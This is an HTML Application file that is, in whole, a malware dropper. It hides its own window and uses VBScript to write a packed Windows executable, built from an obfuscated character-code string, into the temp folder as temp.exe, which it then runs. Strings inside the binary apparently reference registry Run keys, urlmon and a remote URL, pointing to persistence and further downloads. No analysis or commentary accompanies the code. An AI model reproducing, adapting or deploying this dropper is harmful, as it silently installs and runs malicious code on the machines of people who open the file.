<HTML>
<html><head>
<hta:application id=hta_note_id
applicationName=hta_note_name
showInTaskBar=no
caption=no
innerBorder=no
selection=no
scroll=no
contextmenu=no />
<script language=javascript>
window.resizeTo(0, 0);
window.moveTo(0, 0);
</script>
<SCRIPT LANGUAGE="VBScript">

Dim FSO,WSH,OUT,SYS,O
Set FSO=CreateObject("Scripting.FileSystemObject")
Set WSH=CreateObject("WScript.Shell")
SYS=FSO.GetSpecialFolder(2)
Set OUT=FSO.CreateTextFile(SYS&"\temp.exe",True)
Function C(I)
C=Chr(I)
End Function
O=C(0)
Function S(I,J)
S=String(J,I)
End Function
Function N(I)
N=S(O,I)
End Function

OUT.Write("MZ�"&O&C(3)&N(3)&C(4)&N(3)&"PE"&O&O&"L"&C(1)&C(2)&O&"FSG!"&N(8)&"�"&O&C(15)&C(1)&C(11)&C(1)&N(3)&C(18)&N(10)&"88"&N(3)&C(16)&O&O&C(12)&N(5)&"@"&O&O&C(16)&N(3)&C(2)&O&O&C(4)&N(7)&C(4)&N(8)&"@"&N(3)&C(2)&N(6)&C(2)&N(5)&C(16)&O&O&C(16)&N(4)&C(16)&O&O&C(16)&N(6)&C(16)&N(11)&"�8"&O&O&"4"&N(119)&"t"&N(4)&" "&N(3)&C(16)&N(22)&"�"&O&O&"�"&N(4)&C(4)&N(4)&C(16)&N(3)&"0"&O&O&"1"&C(9)&N(3)&C(2)&N(14)&"�"&O&O&"�KERNEL32.dll"&N(3)&"LoadLibraryA"&O&O&"GetProcAddress"&N(25)&"�8@"&O&"�8@"&O&"�8@"&O&"�"&C(1)&"@"&O&O&C(16)&"@"&O&O&"0@"&N(5)&"d"&C(30)&"@"&O&C(1)&N(3)&"%9@"&N(66)&"�"&C(1)&"��MyClas��SO"&O&"FTWARE\M"&C(7)&"icros#ft��Gnd�w�"&C(3)&"Cur�e�tVӿ�io��R�"&C(8)&"0N"&C(16)&"�:p7lF��0Ex���4�Mr�"&C(2)&"1� Reg�S60vNL�J\��{a975�8d0�-y:bf�1���9�4��$sc=Cf�8b|l}ѵwhalhYA��ve��gup�Ins�alピ Com~����"&C(31)&"�!8T���"&C(24)&"S���Pa\h)l�8|�-$re�"&C(17)&"\f"&C(31)&"Rc�.�x"&C(10)&"#\d_"&C(16)&"�lO"&C(15)&"d w< э"&C(20)&"�!zm"&C(24)&"f_a"&C(11)&"=hqt"&C(28)&"p:/Yw"&C(2)&".�e�b%��lyQc��y"&C(8)&C(3)&"uk/drx��ay"&C(14)&"�9 mTP:"&C(1)&"p�I,iF�0�P"&C(18)&C(20)&"Y5�k� �"&C(7)&"l32.d^�(,"&C(1)&C(16)&"��"&C(3)&C(28)&"v"&C(28)&"@"&C(26)&"�"&C(8)&" "&C(16)&"Q�T$"&C(29)&C(12)&"�D8txL>"&C(8)&"P�"&C(18)&"�Qj"&C(3)&"h?�"&C(15)&"�"&C(15)&C(17)&"�"&C(16)&"@"&C(13)&"RP�.ƣ="&C(21)&C(20)&C(3)&"%��t"&C(4)&"2�YË�eQ&�#�"&C(1)&"*"&C(30)&"�"&C(1)&"�"&C(21)&C(34)&"�"&C(4)&"�P�H2QRL"&C(12)&"�9"&S(C(3),2)&"�}?uW"&C(7)&"����3����0IQk"&C(12)&"RjP"&C(1)&" 땧"&C(16)&"-+_."&C(10)&C(4)&"Rf�ʁ"&C(20)&"�"&C(8)&C(2)&"�"&C(13)&"V����"&C(17)&"�=|H�\"&C(3)&"V�׃�"&C(8)&O&"hu"&C(11)&"��_^��B%â"&C(23)&"���i="&O&"l+��TT�����"&C(2)&"��ȃ;�"&C(3)&"���8*"&C(4)&"BQ�! 3��t�~"&C(23)&"�"&C(21)&"T4"&C(9)&"�"&C(15)&C(8)&"��"&C(9)&C(12)&"#CPF"&O&".;�|�_���(!1j�\"&C(1)&"SPU�t��"&C(19)&"Q�3�SH1��<( "&C(30)&"t"&C(27)&"C�M��|�$�F"&C(8)&"\�I+�@�"&C(4)&"��][Rï"&C(7)&"�+���"&C(8)&C(10)&C(29)&"D"&C(14)&"="&C(9)&"`C"&O&",$�WU9*"&C(2)&"��^�mh"&C(5)&C(30)&"�Pu"&C(10)&" ._��,"&C(1)&"�"&C(17)&"�ǔ"&C(9)&"(��W�CTI}Y"&C(10)&"S�"&C(29)&"D��UƬ$<5��5��"&C(15)&"�T�gP�֒"&C(2)&"H8�"&C(21)&"�"&C(17)&"�"&C(6)&"�$V"&C(5)&"��"&C(19)&C(1)&"�;"&C(20)&"t��@R�B"&C(4)&"9uU��A�<"&C(19)&"�):"&C(7)&"�J"&C(16)&"�ӆ"&C(4)&"j"&C(6)&"�s"&C(21)&"�A�"&C(16)&"@��"&C(5)&"~s"&C(6)&":"&C(28)&"�h"&C(34)&C(15)&C(18)&"@=?"&C(17)&"�"&C(7)&O&"h�"&C(3)&"�"&C(10)&"��P�"&C(10)&"��"&C(25)&S(C(8),2)&"�� 0"&C(26)&"}!h6�"&C(19)&C(18)&C(30)&"E"&C(28)&"��"&C(23)&"��,�b"&C(6)&"1H�"&C(1)&"4�SVWhl�3�kˠ�E0"&C(9)&"�R�\��٨�I4�Hh"&C(4)&"��Q�{"&C(29)&"�"&C(8)&C(18)&"T�\uAu�G/D"&C(1)&"49)"&C(23)&"#�p�"&C(6)&"��88XC"&C(3)&"�("&C(28)&"!�"&C(5)&"�"&C(24)&C(14)&"B"&C(2)&"�⼨�"&C(15)&"�R�"&C(20)&C(21)&"(�"&C(6)&"�"&C(20)&"o��ޅf���4#��%�!��1"&C(24)&"&�D����"&C(12)&C(19)&"P6+�d"&C(31)&C(26)&"#Y"&C(28)&"&B"&C(20)&"�"&C(10)&"L�lk�"&C(20)&"$�"&C(7)&"��"&C(21)&"D��"&C(15)&"*�"&C(13)&"ס�`"&C(20)&"J�L�H�!�"&C(17)&C(3)&"�`�"&C(2)&C(18)&"��\)$"&C(6)&"�GU��a�2c"&C(26)&"t"&C(16)&"P)"&C(24)&C(2)&"���"&C(27)&C(16)&"QT"&C(3)&"��0(Ba�P"&C(2)&">Dx�R9("&C(9)&"h�"&C(18)&"�m%�"&C(16)&"����"&C(8)&"�LS"&C(31)&"f"&C(10)&"Rh�"&C(30)&C(21)&"D#��m�dMPsh�"&C(23)&C(1)&C(20)&C(8)&"�"&C(4)&"���"&C(17)&"T��{�"&C(4)&"E"&C(8)&"u�g�e�"&C(17)&"bBb�e�M����"&C(30)&"+H#���"&C(16)&"�#"&C(18)&"�--5"&C(29)&"�"&C(8)&"5�B"&C(16)&"�Z�"&C(1)&C(8)&"�V�ϐ5!R�#�%�Ʉ"&C(24)&"dP�!u��f�B�xQ�J����"&C(10)&"uB"&C(6)&"D�X��߸�?.[:"&C(8)&"�"&C(7)&C(9)&"�"&C(16)&C(7)&C(17)&"=�/ "&C(19)&"��a�T"&C(9)&"GH�`"&C(8)&"P6�äb/,j�`��Q���^"&C(23)&"3�"&C(23)&"�"&C(5)&"Pb-;���AI�`q "&C(13)&"w"&C(9)&"h��0H�M�k�v"&C(7)&"<��5"&C(20)&"�;"&C(8)&"����x�%m�#"&C(12)&"�"&C(25)&"H"&C(12)&"L�U�.�j�"&C(11)&"�"&C(19)&"��"&C(28)&C(1)&"d����r�%�"&C(8)&"��hu��e�:3ۆ]�j"&C(2)&"�DtY"&C(27)&"�"&C(13)&"�W�"&C(14)&"B�d*�O���"&C(27)&"���T�"&C(14)&"Ԇ(��"&C(13)&"�j�"&C(29)&"�"&C(34)&"�;9"&C(29)&"��u"&C(12)&"h��;"&C(21)&"��O����h�"&C(23)&"���"&C(11)&"��"&C(31)&"�Р@E�j�"&C(6)&"-"&C(13)&"5�"&C(27)&"�"&C(20)&"��"&C(8)&"�&�$x"&C(21)&"�.�"&C(23)&"U�"&C(8)&"3���"&C(20)&"$��o"&C(15)&"0�u"&C(3)&"�>"&C(34)&"�:F�"&C(19)&"�"&C(6)&"��t"&C(4)&"<�"&C(28)&"�"&C(19)&"y�� v�"&C(12)&"�О��d"&C(19)&"���"&C(1)&"t"&C(17)&C(15)&"w�"&C(27)&"��"&C(14)&"X(<�,��"&C(3)&"j"&C(10)&"XPVS�HE$!1��"&C(4)&C(15)&"��2ca���"&C(8)&"�"&C(9)&"�MK�"&C(10)&"m"&C(15)&"��Y�O"&C(3)&"/�u�$@�do5"&C(6)&C(34)&"p��"&C(20)&C(3)&C(5)&"P"&C(6)&"�R"&C(21)&"*Xis�̦"&C(1)&"�H�*�x"&C(12)&O&O&C(1)&C(28)&"�"&C(16)&"@"&C(3)&"SHEL�32.8dl�"&C(27)&"Uhe"&C(12)&"�x�cut�A�"&C(1)&"o�?@rlmon�"&C(30)&"WR=LD�wz�a�T�Fxi�#�"&C(16)&"USESRAy"&C(12)&"harLHe�7E�DV�PSI"&C(29)&C(6)&"TegCzvsxKPy"&C(12)&"Ozpen"&C(23)&"A"&C(13)&C(12)&"D��F�"&C(14)&"C"&C(26)&"A�"&C(19)&C(14)&"S"&C(7)&"4Valu�"&C(15)&"cCr��V"&C(12)&C(31)&C(1)&"a��WIN�"&C(4)&"*Td3Kn8r�deG"&C(6)&"C"&C(25)&"�"&C(18)&"c�"&C(30)&"dS�c"&C(34)&"V"&C(28)&"QK��T�OU�|"&C(20)&"ibr�f�I��ts�j"&C(7)&C(11)&"Mrdu��Ha�P��"&C(20)&C(17)&"��"&C(20)&"Nam"&C(19)&"�Proc�dƇ�s"&C(30)&C(14)&"n��}RpG;S�"&C(26)&"�mDir��o�-"&C(29)&"p�*"&C(18)&"E��U�R�}u"&C(7)&"�N�xt�@mp�;"&C(23)&"A֍�0E��nqIl�1p,Sn��s��2U�Ђ޴p"&C(21)&"®3svUw"&C(30)&"ppYHn��toE�g�i"&C(27)&"\G"&C(24)&"�T"&C(14)&"r�uzp"&C(21)&"nfo��c�RIp MSVCIRH�a��P�"&C(17)&"m�"&C(20)&"_�=t��|uy��"&C(30)&"c"&C(26)&C(34)&"h"&C(6)&"�f���3zh�"&C(3)&"gxeV0eI"&C(6)&"X"&C(8)&C(6)&"�Mu�"&C(24)&"Vm2�n�g"&C(15)&"[�y�ms"&C(29)&"��f0SdReZ:uh˂ ��A2dj� �f�ivI)��m+���l�_Hh=�r3"&C(6)&C(2)&O&"��"&C(1)&"@"&O&"�����V�������"&C(19)&"s�3��"&C(19)&"s"&C(22)&"3��"&C(19)&"s"&C(31)&"��A�"&C(16)&"�"&C(19)&C(18)&"�s�u<����S"&C(8)&C(2)&"���"&C(1)&"u"&C(14)&"�S"&C(4)&"�&���t/"&C(19)&"��"&C(26)&"�H��"&C(8)&"��S"&C(4)&"="&O&"}"&O&O&"s"&C(10)&"��"&C(5)&"s"&C(6)&"��w"&C(2)&"AA��Ŷ"&O&"V��+��^띋�^�Ht"&C(10)&"y"&C(2)&"�PV��뇭�^F��V�"&C(19)&"����u��"&C(14)&"t�y"&C(5)&"F�P�"&C(9)&"�"&C(14)&C(15)&"�Y���VU�S"&C(4)&"���3�A�"&S(C(19),2)&"��"&C(19)&"r��"&C(2)&"�u"&C(5)&"�"&C(22)&"F"&C(18)&"��%9"&N(10)&"T"&C(1)&O&O&"%9"&N(22)&"a"&C(1)&O&O&"o"&C(1)&N(21))
OUT.Close

WSH.run(SYS & "\temp.exe") 

</SCRIPT></HTML>
